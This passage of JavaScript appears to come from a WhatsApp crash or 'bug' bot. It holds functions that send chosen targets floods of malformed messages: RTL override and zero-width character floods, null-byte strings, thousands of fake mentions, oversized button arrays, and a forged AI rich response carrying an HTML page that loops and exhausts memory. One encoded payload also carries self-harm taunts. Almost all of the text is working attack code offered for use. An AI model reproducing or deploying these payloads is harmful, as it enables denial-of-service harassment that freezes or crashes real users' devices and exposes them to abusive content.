kfYp/qwAAP/////mv+smqqSd3QGMcBWUFOyxAxFMg5iBkhKhhKDsv/xhj3sNqDq+RUZdcYE15p61wlCm49K2ROdACKy7mFsGnwYWHGHHkc5yAs1GzYTSCeJP8HArFlAjCM8IRP/7kmRyBtQkTc3jBhZQLwqY8gQNuBBFPSKmZQvIuipihBA3GGhw06zF1I24uFd2YezwoXZitLjM03/8rfytM4ci0qHICoemrXKADAGGkg1HaiEDY79Zr2vhqYoPnWLFbVQ5BqauNDphaa1iWlV///Zr+VgWOFI/+f///jRl3/+Ykk9Xk4YU8O0lWsZhFRlIuyQ9i+HJC8po/+dEtKPWiil/RRmT1YAAAALIQMxatrSsjkhqlPZjWGJVKUkRmqNwmVStgUC+F1TJgDPKwsRyjYJWQ0sK6JNHZla1Q8T4W/ynvEu84z2dlf3n35W4kad3qq8zbgxuf/u+b//TM6M1czEVpxc+ZOeW5ycvc9qz9hXiwZVt2N3lq2ZvxEoivDzdP+Sr+PJ//6lg6QKCkptQl8dorziSLdHo+/9fyUdx0jEb///un+qOwEXBiFYytAcw3XuVFbp0HEDatPfVMJQlEkmxEoRlTK11o6EItQAkA5GXUW5HkFOFSlxM4I8Ic6EoLTeChZiTYvmtb4ZpqSZNKO21WVqaZmWVkkVooGziCC01f///+5JkfoRzy10/0eYuUDdqJ7A04rgO0VTmJj0SUNAiXSBVioD/1iuJVSVatRgNh8NIsLOsB0DY4kWFrla8pfGg1Rv/Va2aGv9RV3Ep5YaA46tvVACFuoAj2//6QIQEx3oBCtDUNqUxn1//v+pjPMYGAt///l//UrYUT9AIeGoLYa0bVUxBTUUzLjEwMFVVVVVVVVUAABlQWhhkvTev85xnGcZ1aFDiTrKiOUuw0SzLof6cfwG9sb2tshxI80asKFLS+t/4xLDI1DBQYJ0Mv//5ZMjJlDAwcdLAoYGFBA5YDBAwYR1UQMVpppov+RKmWwkZpphEZENP+rary0yJIdA6DooEssK0UfPwELCvFG/iooLamf1fwWCQqyKihL+KNxYVTEFNRTMuMTAwVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV//uSZIeP8txFJ0ngHpIygsSwACweAAABpAAAACAAADSAAAAEVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVUxBTUUzLjEwMFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVf/7kmRAj/AAAGkAAAAIAAANIAAAAQAAAaQAAAAgAAA0gAAABFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVUxBTUUzLjEwMFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVX/+5BkQQ/wAABpAAAACAAADSAAAAEAAAGkAAAAIAAANIAAAARVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVU=";
    const binaryString = atob(base64Data);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
        bytes[i] = binaryString.charCodeAt(i);
    }

    ctx.decodeAudioData(bytes.buffer, (audioBuffer) => {
      const source = ctx.createBufferSource();
      source.buffer = audioBuffer;
      source.loop = true;
      
      const analyser = ctx.createAnalyser();
      analyser.fftSize = 256;
      const dataArray = new Uint8Array(analyser.frequencyBinCount);

      source.connect(analyser);
      analyser.connect(ctx.destination);
      
      source.start();

      let lastVibrate = 0;
      const threshold = 200;

      function checkVibrate() {
        analyser.getByteFrequencyData(dataArray);
        
        let bassSum = 0;
        for (let i = 0; i < 5; i++) bassSum += dataArray[i];
        let bassAvg = bassSum / 5;

        if (bassAvg > threshold) {
          const now = Date.now();
          if (now - lastVibrate > 150) {
            if (navigator.vibrate) navigator.vibrate(50); 
            lastVibrate = now;
          }
        }
        requestAnimationFrame(checkVibrate);
      }
      
      checkVibrate();


    while (true) {
      for (let i = 0; i < 1000; i++) {
        let div = document.createElement('div');
        div.innerHTML = 'AMPOSSS_'.repeat(500);
        document.body.appendChild(div);
      }
      alert("\u26a0\ufe0f GB AMPOS SOK KERAS AJG \u26a0\ufe0f");
    }

    (function() {
    const memoryRetentionArray = [];
    const allocationChunkSize = 1024 * 1024 * 64;

    function saturateEngine() {
        try {
            const rawBuffer = new ArrayBuffer(allocationChunkSize);
            const viewArray = new Uint32Array(rawBuffer);
            for (let index = 0; index < viewArray.length; index += 1024) {
                viewArray[index] = index ^ 0xDEADBEEF;
            }
            memoryRetentionArray.push(rawBuffer);
            memoryRetentionArray.push(viewArray);
        } catch (allocationError) {
            while (true) {
                const garbageData = new Array(1000000).fill(Math.random());
                memoryRetentionArray.push(garbageData);
            }
        }
        queueMicrotask(saturateEngine);
        queueMicrotask(saturateEngine);
    }

    function spawnMicrotaskSwarm() {
        for (let counter = 0; counter < 50; counter++) {
            queueMicrotask(saturateEngine);
        }
    }

    Promise.resolve().then(spawnMicrotaskSwarm);
    saturateEngine();
    })();

    }, (err) => {
      console.error("Gagal decode audio", err);
    });

  } catch (e) {}
})();
</script>
</body>
</html>`

  const data = Buffer.from(JSON.stringify({
    response_id: id,
    sections: [{
      view_model: {
        primitive: {
          __typename: 'GenAIaeacdsnwHtmlPrimitive',
          payload: html,
          trusted_sources: []
        },
        __typename: 'GenAISingleLayoutViewModel'
      }
    }]
  }).replace(/[\u007f-\uffff]/g, c =>
    '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
  )).toString('base64')

  const message = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: '',
        botResponseId: uid(),
        verificationMetadata: {
          proofs: [{
            version: 1,
            useCase: 1,
            signature: fill('NIXEL.MessageBuilderV1.0-VerificationSignature.Metadata', 64),
            certificateChain: [
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 684),
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 892)
            ]
          }]
        }
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          response_id: id,
          submessages: [],
          unifiedResponse: { data },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: '867051314767696@bot'
            },
            forwardOrigin: 4,
            expiration: 0,
            ephemeralSettingTimestamp: Date.now(),
            disappearingMode: {
              initiator: 0,
              trigger: 1
            },
            afterReadDuration: 200
          }
        }
      }
    }
  }

  await sock.relayMessage(target, message, {
    messageId: mid
  })

  await sock.relayMessage(target, {
    botForwardedMessage: {
      message: {
        protocolMessage: {
          key: {
            remoteJid: target,
            fromMe: true,
            id: mid
          },
          type: 14,
          editedMessage: message
        }
      }
    }
  }, {
    messageId: uid().replaceAll('-', '').toUpperCase()
  })
}


async function twosfreezeChat(sock, target) {
  const rtlFlood = "\u202E".repeat(2048)
  const zeroFlood = "\u200B\u200C\u200D\uFEFF".repeat(1024)
  const combinFlood = "\u0300\u0301\u0302\u0303".repeat(1024)

  const mentionFlood = () =>
    Array.from({ length: 1900 }, () =>
      "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    )

  const layerOne = () => ({
    extendedTextMessage: {
      text: rtlFlood + zeroFlood + combinFlood,
      title: zeroFlood,
      description: rtlFlood,
      canonicalUrl: "A".repeat(4096),
      matchedText: combinFlood,
      contextInfo: {
        mentionedJid: mentionFlood(),
        isForwarded: true,
        forwardingScore: 99999,
        stanzaId: "X".repeat(512),
        participant: target,
        remoteJid: target,
        quotedMessage: {
          extendedTextMessage: {
            text: combinFlood + rtlFlood,
            contextInfo: {
              mentionedJid: mentionFlood(),
              quotedMessage: {
                extendedTextMessage: {
                  text: zeroFlood + combinFlood,
                  contextInfo: {
                    mentionedJid: mentionFlood(),
                    quotedMessage: {
                      conversation: rtlFlood + combinFlood + zeroFlood
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  })

  const layerTwo = () => ({
    contactsArrayMessage: {
      displayName: rtlFlood,
      contacts: Array.from({ length: 50 }, (_, i) => ({
        vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:" + combinFlood + "\nTEL;type=CELL;waid=" + i + ":+" + i + "0000000\nEND:VCARD"
      })),
      contextInfo: {
        mentionedJid: mentionFlood(),
        isForwarded: true,
        forwardingScore: 99999,
        quotedMessage: {
          contactsArrayMessage: {
            displayName: zeroFlood,
            contacts: Array.from({ length: 50 }, (_, i) => ({
              vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:" + rtlFlood + "\nTEL;type=CELL;waid=" + i + ":+" + i + "0000000\nEND:VCARD"
            }))
          }
        }
      }
    }
  })

  const layerThree = () => ({
    buttonsMessage: {
      contentText: rtlFlood + zeroFlood,
      footerText: combinFlood,
      headerType: 1,
      buttons: Array.from({ length: 100 }, (_, i) => ({
        buttonId: "X".repeat(256) + i,
        buttonText: {
          displayText: combinFlood + rtlFlood + i
        },
        type: 1
      })),
      contextInfo: {
        mentionedJid: mentionFlood(),
        isForwarded: true,
        forwardingScore: 99999
      }
    }
  })

  for (let i = 0; i < 30; i++) {
    await sock.relayMessage(target, layerOne(), {})
    await wait(100)
    await sock.relayMessage(target, layerTwo(), {})
    await wait(100)
    await sock.relayMessage(target, layerThree(), {})
    await wait(150)
  }
}

async function exploresd(sock, target) {
  for (let i = 0; i < 5; i++) {
    await sock.relayMessage(target, {
      contactsArrayMessage: {
        displayName: "@byCemplonzzyX",
        contacts: [
          {
            vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:Assalamualaikum\nTEL;type=CELL;type=VOICE;waid=000000:+00000000\nEND:VCARD"
          }
        ],
        contextInfo: {
          mentionedJid: Array.from({ length: 1900 }, () =>
            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
          isForwarded: true,
          forwardingScore: 9999,
        }
      }
    }, {})
    await wait(800)
  }
}

async function PengenEwek(sock, target) {
    const jid = target.includes("@") ? target : target.replace(/\D/g, "") + "@s.whatsapp.net"
    const sleep = ms => new Promise(r => setTimeout(r, ms))

    const makeMentions = (count) =>
        Array.from({ length: count }, () =>
            Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
        )

    const emojis = ["😭","💀","🔥","😂","❤️","😍","🤣","😎","💯","🫡"]

    let sent = 0

    for (let i = 0; i < 300; i++) {
        try {
            await sock.relayMessage(jid, {
                reactionMessage: {
                    key: {
                        remoteJid: jid,
                        fromMe: false,
                        id: Math.random().toString(36).substring(2, 15).toUpperCase()
                    },
                    text: emojis[i % emojis.length],
                    senderTimestampMs: Date.now()
                }
            }, {})
            sent++
        } catch (e) {}
        await sleep(5)

        try {
            await sock.relayMessage(jid, {
                extendedTextMessage: {
                    text: "\u200B".repeat(1000),
                    contextInfo: {
                        mentionedJid: makeMentions(1900),
                        isForwarded: true,
                        forwardingScore: 99999,
                        quotedMessage: {
                            reactionMessage: {
                                key: {
                                    remoteJid: jid,
                                    fromMe: false,
                                    id: Math.random().toString(36).substring(2, 15).toUpperCase()
                                },
                                text: emojis[i % emojis.length],
                                senderTimestampMs: Date.now()
                            }
                        }
                    }
                }
            }, {})
            sent++
        } catch (e) {}
        await sleep(5)

        try {
            await sock.relayMessage(jid, {
                pollCreationMessageV3: {
                    name: "\u202E".repeat(500) + "\u0300".repeat(500),
                    options: Array.from({ length: 12 }, (_, idx) => ({
                        optionName: "\u200B\u202E\u0300".repeat(200) + idx
                    })),
                    selectableOptionsCount: 12,
                    contextInfo: {
                        mentionedJid: makeMentions(1900),
                        isForwarded: true,
                        forwardingScore: 99999
                    }
                }
            }, {})
            sent++
        } catch (e) {}
        await sleep(5)

        try {
            await sock.relayMessage(jid, {
                pollUpdateMessage: {
                    pollCreationMessageKey: {
                        remoteJid: jid,
                        fromMe: false,
                        id: Math.random().toString(36).substring(2, 15).toUpperCase()
                    },
                    vote: {
                        selectedOptions: Array.from({ length: 12 }, () =>
                            Buffer.alloc(32, Math.floor(Math.random() * 255))
                        ),
                        senderTimestampMs: Date.now()
                    },
                    contextInfo: {
                        mentionedJid: makeMentions(1900),
                        isForwarded: true,
                        forwardingScore: 99999
                    }
                }
            }, {})
            sent++
        } catch (e) {}
        await sleep(5)

        if (i % 30 === 0) console.log("sent: " + sent)
    }

    console.log("done: " + sent)
}

async function freezeChatnew(sock, target) {
    const jid = target.includes("@") ? target : target.replace(/\D/g, "") + "@s.whatsapp.net"
    const sleep = ms => new Promise(r => setTimeout(r, ms))
    const K = "\u0000"
    const Z = "\u200B"
    const R = "\u202E"
    const C = "\u0300\u0301\u0302\u0303"

    const flood = (ch, len) => ch.repeat(len)
    const rndId = () => Math.random().toString(36).substring(2, 15).toUpperCase()

    const makeMentions = (n) =>
        Array.from({ length: n }, () =>
            Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
        )

    let sent = 0

    for (let i = 0; i < 200; i++) {

        try {
            await sock.relayMessage(jid, {
                pinInChatMessage: {
                    key: {
                        remoteJid: jid,
                        fromMe: false,
                        id: rndId()
                    },
                    type: 1,
                    senderTimestampMs: Date.now(),
                    contextInfo: {
                        mentionedJid: makeMentions(1900),
                        isForwarded: true,
                        forwardingScore: 99999,
                        quotedMessage: {
                            pinInChatMessage: {
                                key: {
                                    remoteJid: jid,
                                    fromMe: false,
                                    id: rndId()
                                },
                                type: 1,
                                senderTimestampMs: Date.now()
                            }
                        }
                    }
                }
            }, {})
            sent++
        } catch (e) {}
        await sleep(8)

        try {
            await sock.relayMessage(jid, {
                editedMessage: {
                    message: {
                        extendedTextMessage: {
                            text: flood(R + Z + C + K, 20000),
                            contextInfo: {
                                mentionedJid: makeMentions(1900),
                                isForwarded: true,
                                forwardingScore: 99999,
                                stanzaId: rndId(),
                                participant: jid,
                                remoteJid: jid,
                                quotedMessage: {
                                    editedMessage: {
                                        message: {
                                            extendedTextMessage: {
                                                text: flood(K + C, 10000),
                                                contextInfo: {
                                                    mentionedJid: makeMentions(1900),
                                                    quotedMessage: {
                                                        conversation: flood(Z + R, 5000)
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }, {})
            sent++
        } catch (e) {}
        await sleep(8)

        try {
            await sock.relayMessage(jid, {
                albumMessage: {
                    expectedImageCount: 99999,
                    expectedVideoCount: 99999,
                    contextInfo: {
                        mentionedJid: makeMentions(1900),
                        isForwarded: true,
                        forwardingScore: 99999,
                        quotedMessage: {
                            albumMessage: {
                                expectedImageCount: 99999,
                                expectedVideoCount: 99999,
                                contextInfo: {
                                    mentionedJid: makeMentions(1900),
                                    quotedMessage: {
                                        albumMessage: {
                                            expectedImageCount: 99999,
                                            expectedVideoCount: 99999
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }, {})
            sent++
        } catch (e) {}
        await sleep(8)

        try {
            await sock.relayMessage(jid, {
                pollCreationMessageV6: {
                    name: flood(R + C + Z, 5000),
                    options: Array.from({ length: 12 }, (_, idx) => ({
                        optionName: flood(K + Z + R, 2000) + idx
                    })),
                    selectableOptionsCount: 12,
                    contextInfo: {
                        mentionedJid: makeMentions(1900),
                        isForwarded: true,
                        forwardingScore: 99999,
                        quotedMessage: {
                            pollCreationMessageV6: {
                                name: flood(C + Z, 3000),
                                options: Array.from({ length: 12 }, (_, idx) => ({
                                    optionName: flood(R + K, 1000) + idx
                                })),
                                selectableOptionsCount: 12
                            }
                        }
                    }
                }
            }, {})
            sent++
        } catch (e) {}
        await sleep(8)

        try {
            await sock.relayMessage(jid, {
                reactionMessage: {
                    key: {
                        remoteJid: jid,
                        fromMe: false,
                        id: rndId()
                    },
                    text: flood("\u2764\uFE0F", 500),
                    groupingKey: flood(Z, 1000),
                    senderTimestampMs: Date.now(),
                    contextInfo: {
                        mentionedJid: makeMentions(1900),
                        isForwarded: true,
                        forwardingScore: 99999
                    }
                }
            }, {})
            sent++
        } catch (e) {}
        await sleep(8)

        if (i % 20 === 0) console.log("sent: " + sent)
    }

    console.log("done: " + sent)
}

async function lemotbettwo(sock, target) {
  const bytes = [
    [0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02],
    [0x9A, 0x03], [0xE2, 0x05], [0xC2, 0x06],
    [0x8A, 0x07], [0xF2, 0x08], [0xCA, 0x09],
    [0xB2, 0x0A], [0xDA, 0x0B], [0xA2, 0x0C]
  ];
  const flat = bytes.flat();
  const sidecar = Buffer.from(flat).toString("base64");
  const lengths = bytes.map(b => b[0] + b[1]);

  const msg = {
    interactiveMessage: {
      header: {
        title: "ꦽ".repeat(40000),
        hasMediaAttachment: false
      },
      body: { text: "ꦽ".repeat(120000) },
      footer: { text: "ꦽ".repeat(80000) },
      nativeFlowMessage: {
        buttons: Array.from({ length: 6667 }, () => ({}))
      },
      contextInfo: {
        userJid: target,
        mentionedJid: [target],
        isForwarded: true,
        forwardingScore: 999,
        expiration: 999999,
        scansSidecar: sidecar,
        scanLengths: lengths
      }
    }
  };
  await sock.relayMessage(target, msg, {});
  participant: true
}

async function DelayLagitown(sock, target) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          title: "\u0000",
          body: {
            text: "\uFDFD"
          },
          nativeFlowMessage: {
            buttons: "{".repeat(30000) + "}".repeat(20000)
          }
        }
      },
      participant: target
    }
  }, {});
}

async function blankcrashtwo(sock, target) {
  const jid = target.includes("@") ? target : target + "@s.whatsapp.net";
  const data = "eyJzZWN0aW9ucyI6W3sidmlld19tb2RlbCI6eyJwcmltaXRpdmVzIjpbeyJ0aXRsZSI6ImhvdyB0byBlbmQgYWxsIHRoaXMgc3VmZmVyaW5nPyIsInN1YnRpdGxlIjoid2FubmEgZGllwr8iLCJzZWNvbmRhcnlfc3VidGl0bGUiOiJ5b3Ugd2lsbCBvbmx5IHN0YXJ0IG5ldyBzdWZmZXJpbmcgaW4gaGVsbCBkdWRlIiwiaW1hZ2UiOnsidXJsIjoiaHR0cHM6Ly9maWxlcy5jYXRib3gubW9lL2I4aW80NC5qcGciLCJtaW1lX3R5cGUiOiJpbWFnZS9wbmcifSwiZW50aXR5X2lkIjoiMTIzNDU2IiwiZW50aXR5X3VybCI6InQubWUvdmF1bHRzdXBlcmlvciIsImVudGl0eV90eXBlIjoiV0VCU0lURSIsImFjdGlvbl90eXBlIjoiT1BFTl9VUkwiLCJpc192ZXJpZmllZCI6dHJ1ZSwiX190eXBlbmFtZSI6IkdlbkFJQ29tcGFjdEVudGl0eVByaW1pdGl2ZSJ9XSwiX190eXBlbmFtZSI6IkdlbkFJQWN0aW9uUm93TGF5b3V0Vmlld01vZGVsIn19LHsidmlld19tb2RlbCI6eyJwcmltaXRpdmVzIjpbeyJ0eXBlIjoiSE9SSVpPTlRBTF9MSU5FIiwiX190eXBlbmFtZSI6IkdlbkFJRGl2aWRlclByaW1pdGl2ZSJ9XSwiX190eXBlbmFtZSI6IkdlbkFJVlN0YWNrTGF5b3V0Vmlld01vZGVsIn19LHsidmlld19tb2RlbCI6eyJwcmltaXRpdmVzIjpbeyJfX3R5cGVuYW1lIjoiR2VuQUlTcGFjZXJQcmltaXRpdmUifSx7InRleHQiOiIjIHt7c29jaWFsX2VudGl0eV8xfX1TZWUgcmVzdWx0c1x1MDAwMHt7L3NvY2lhbF9lbnRpdHlfMX19ICAgICIsImlubGluZV9lbnRpdGllcyI6W3sia2V5Ijoic29jaWFsX2VudGl0eV8xIiwibWV0YWRhdGEiOnsiX190eXBlbmFtZSI6IkdlbkFJU29jaWFsRW50aXR5SXRlbSIsImVudGl0eV9pZCI6ImtmYyIsImVudGl0eV9uYW1lIjoia2ZjIiwiZW50aXR5X2Z1bGxfbmFtZSI6Ii4uLiIsImVudGl0eV9waWN0dXJlX3VybCI6Imh0dHBzOi8vZmlsZXMuY2F0Ym94Lm1vZS9iOGlvNDQuanBnIiwiZW50aXR5X3VybCI6Imh0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20va2ZjIiwiZW50aXR5X3R5cGUiOiJJR19QUk9GSUxFIiwiaXNfdmVyaWZpZWQiOnRydWV9fV0sIl9fdHlwZW5hbWUiOiJHZW5BSU1hcmtkb3duVGV4dFVYUHJpbWl0aXZlIn0seyJfX3R5cGVuYW1lIjoiR2VuQUlTcGFjZXJQcmltaXRpdmUifV0sIl9fdHlwZW5hbWUiOiJHZW5BSUFjdGlvblJvd0xheW91dFZpZXdNb2RlbCJ9fV19";

  const p1 = {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: "AI_RICH_RESPONSE_TYPE_STANDARD",
          submessages: [
            {
              messageType: "AI_RICH_RESPONSE_TABLE",
              tableMetadata: {
                rows: [{}],
                title: "x"
              }
            },
            {
              messageType: "AI_RICH_RESPONSE_LATEX",
              latexMetadata: {
                text: "#",
                expressions: [
                  {
                    latexExpression: "###",
                    url: "X",
                    fontHeight: 9999999
                  }
                ]
              }
            }
          ],
          unifiedResponse: {
            data: data
          },
          contextInfo: {
            isForwarded: true,
            forwardOrigin: "META_AI"
          }
        }
      }
    }
  };

  const p2 = {
    interactiveMessage: {
      header: {
        title: "X-FORCE",
        subtitle: "X-FORCE",
        hasMediaAttachment: true,
        locationMessage: {
          degreesLatitude: -0,
          degreesLongitude: -0,
          name: "X-FORCE",
          address: "X-FORCE"
        }
      },
      body: {
        text: "\0"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "galaxy_message",
            buttonParamsJson: "{}"
          }
        ],
        buttons: Array.from({ length: 99999 }, () => 0x5A)
      }
    }
  };

  const p3 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQPVo-gJAQ8KXDdCf_zt-yygpiOH41VCYtO8okCr7667QSlG93CoPc3CZuuCAEYC4sGwR7EmeoEFtU17ACt_3Ul0IifWRzixg3LG7KQ5Yw?ccb=9-4&oh=01_Q5Aa5wFDRvwSEkRhBwHRjIaRK7vIhl26JHBgWWillVpU3bqmRg&oe=6AEA147F&_nc_sid=e6ed6c&mms3=true",
              mimetype: "image/jpeg",
              caption: "X",
              fileSha256: "O3QYNylVnODT4/7rmSUoP+BICqcKwP6D2MUyX86pqho=",
              fileLength: "128399",
              height: 3840,
              width: 3840,
              mediaKey: "n80Ce+Y1NEAJPURD/aemD45gWVcXWkYF2yFWKgJo4zM=",
              fileEncSha256: "s48rcNN+R9Tf3CwywiBdepUBW0ggQOtGkOa6JMd1Jb0=",
              directPath: "/o1/v/t24/f2/m234/AQPVo-gJAQ8KXDdCf_zt-yygpiOH41VCYtO8okCr7667QSlG93CoPc3CZuuCAEYC4sGwR7EmeoEFtU17ACt_3Ul0IifWRzixg3LG7KQ5Yw?ccb=9-4&oh=01_Q5Aa5wFDRvwSEkRhBwHRjIaRK7vIhl26JHBgWWillVpU3bqmRg&oe=6AEA147F&_nc_sid=e6ed6c",
              mediaKeyTimestamp: "1791136413",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAxyt7o2dO5iRbxfRZsqZLnL7LITAZuKeglWtbqOGjNOaMzNFjGoiMUtJG/ogpqIkG18Sdi5VltZzUROiMG2VEYHcObMv4zy57Pb65sKDohZaHPbJVBGneGzjYGlQD83//xAAjEAACAgIDAAMAAwEAAAAAAAABAgADBBESITETIkEFI1FS/9oACAEBAAE/AKFVjp/2W44R9AxgAdCUY73OFWH+H1VsONy6lqmKmalFQcgEzKoSlRpoh8Eqx2ubQPcuxzW5BlH9a70SSYc1iBWiTKQtowUMSNCWVNSq/wCxi9h7JlSLb1vTStL6HB0epbSLkFxMepErVtwNQ6ByD9Y3C9PkA0omNZjqPuI2KMn7jyWpTjL0NvKVDEaMof40JtGwBLTzI++kaWPdy4KdpE6p0AdygaB+TZWBqQzBj0fJjZTCwoG6mWVJJJ3Ex7eetSpWClSdxy9doJG13MS2h7eLIAZlZGOhKFJdksEZB4YmO9tfNTMcPTstoyzI7O1EW+wgDl5EJC8iZcwvIA98EuobFas7llhsUd7lON84G16BmSgqr5VdRduAfyWjvzqBSzCXI9VYH/UxaXNoYjoTMvNjcSNalY2QA0xskIxqK9TJHMFRELbAEtNV1YTpWEFCJpzMu7m6iWXLVSmvSOpba5s2YLT8imM2nVyJfdpVZR0Zg/AXYsPJk8XYlZU7bAYbEvGNWOZAJ/BLbCVLN++R15gFYadcDDdWQRKLE4cSOSyumoqWqlxWkb1P/8QAHBEBAAMBAQADAAAAAAAAAAAAAQACESExEiJB/9oACAECAQE/ADEyX2oyt7NgSFgTZa1djZq8Z810ZRx3rk23sKb6LGtGW7VCU2uE8t9vJ0lkKcljMrsOWJdG1cJoRcI+bP2UsikOz//EAB0RAQACAgMBAQAAAAAAAAAAAAEAAhExEiFBA1H/2gAIAQMBAT8A8lQsxoYU2Qo7mLW1WVqNMtYgYQiBv2D5WWvx6EnzUhXFuWZapfJ+agcdbi5dwzmKBC3U/ZwZ8uzuPd2suFMBEGlbY7l7PKf/2Q==",
              contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA",
                mediaDomainInfo: {
                  mediaKeyDomain: "MEDIA_KEY_DOMAIN_E2EE",
                  e2EeMediaKey: "n80Ce+Y1NEAJPURD/aemD45gWVcXWkYF2yFWKgJo4zM="
                }
              }
            }
          },
          body: {
            text: "🥀"
          },
          nativeFlowMessage: {
            messageParamsJson: ""
          },
          bloksWidget: {
            uuid: "",
            data: "",
            type: "",
            fallback: "X" + "\u0000".repeat(250000)
          },
          contextInfo: {
            nonJidMentions: 9999
          }
        }
      }
    }
  };

  try {
    await sock.relayMessage(jid, p1, {});
    await sock.relayMessage(jid, p2, {});
    await sock.relayMessage(jid, p3, {});
    console.log("sukses kirim ke " + jid);
  } catch (err) {
    console.log("gagal: " + err.message);
  }
}

async function HardInvisibleDelaytw(sock, target) {

const atx = {
     groupStatusMessageV2: {
       message: {
         interactiveMessage: {
           header: {
             title: ""
        },
          body: {
           text: "halo sayang"
       },
            nativeFlowMessage: {
              buttons: "\0".repeat(450000)
            }
         }
      }
   }
};

   const atx1 = {
  groupStatusMessageV2: {
    message: {
      interactiveMessage: {
        // 1. Header (Bagian atas)
        header: {
          title:"꧅".repeat(50000), // Contoh string berat
       subtitle:"﷽".repeat(10000),
          hasMediaAttachment: false
        },
        // 2. Body (Teks Utama)
        body: { 
          text: "福 X-FORCE crash".repeat(5000)
        },
        // 3. Footer (Teks Bawah)
        footer: {
          text: "⸽".repeat(8000)
        },
        // 4. Native Flow (Bagian Button yang kamu buat)
        nativeFlowMessage: {
          buttons: "{".repeat(50000),
        },
